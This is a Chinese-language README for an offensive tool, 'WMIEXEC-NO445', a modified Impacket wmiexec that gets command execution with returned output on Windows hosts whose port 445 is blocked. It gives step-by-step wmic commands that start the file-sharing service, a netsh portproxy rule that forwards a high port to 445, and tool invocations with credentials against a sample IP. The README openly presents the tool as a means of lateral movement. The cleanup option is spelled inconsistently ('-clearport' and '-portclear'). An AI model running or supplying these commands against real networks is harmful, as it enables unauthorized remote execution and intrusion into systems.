# WMIEXEC-NO445

impacket的wmiexec在没有打开445端口的情况下，进行有回显的命令执行工具。

## 安装方法

在安装好impacket的情况下，直接使用wmiexec-no445.py替换wmiexec.py就行。

## 原理介绍

此方法是通过wmi的silentcommand模式来直接通过135和高端口进行命令执行，后通过目标机器的netsh将高端口的流量转发到445，从而达到绕过445端口进行有回显的命令执行。因此此方法相比于wmi的silentcommand模式命令执行没有增加任何限制条件，只要能进行命令执行就能有回显。并且因为是通过smb来进行回显，因此也没有回显的长度限制。

## Windows手动回显命令执行

### 一、先打开文件共享服务

> wmic /node:172.16.178.9 /user:windows8 /password:* service where name="LanmanServer" call startservice

### 二、进行端口转发(将445端口转发到44500端口)

> wmic /node:172.16.178.9 /user:windows8 /password:* process call create "cmd.exe /c netsh interface portproxy add v4tov4 listenport=44500 listenaddress=0.0.0.0 connectport=445 connectaddress=127.0.0.1"

### 三、通过原始的impacket进行命令执行

在执行之前需要修改nmb.py中的SMB_SESSION_PORT值为更改的端口

> python3 wmiexec.py windows.local/windows8:*@172.16.178.9 "whoami"

## 工具使用方法

* 工具使用的前提是目标机器设置的端口黑名单，有打开135端口和10000以上的高端口，就能通过此工具进行横行移动了。

在目标没有打开445的情况下执行回显命令（默认445的转发端口为44500）：

> python3 wmiexec-no445.py windows.local/windows8:*@172.16.178.9 "ipconfig" -no445

在指定50000为445的转发端口下执行回显命令：

> python3 wmiexec-no445.py windows.local/windows8:*@172.16.178.9 "ipconfig" -no445 -proxyport 50000

清除目标机器中的端口转发设置（默认清除44500）

> python3 wmiexec-no445.py windows.local/windows8:*@172.16.178.9 -clearport

清除目标机器中的特定转发端口

> python3 wmiexec-no445.py windows.local/windows8:*@172.16.178.9 -portclear -proxyport 50000

## 使用实例

![image-20220209111347219](/Users/windows7/Documents/ReadMe/image-20220209111347219.png)

